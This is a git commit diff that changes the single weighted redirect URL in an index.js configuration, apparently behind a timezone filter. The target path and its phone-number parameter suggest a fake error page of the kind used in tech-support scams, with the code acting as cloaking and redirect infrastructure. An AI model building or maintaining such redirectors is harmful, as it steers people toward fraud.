5feabdc4b9f164dccf1b6818ff615ffe4b0e2393
paalakash <palaksh452@gmail.com>
2026-07-17 05:32:42 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-p5cze.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
+    { url: "https://seahorse-app-jfos5.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 1.0 }
     
 ];
 
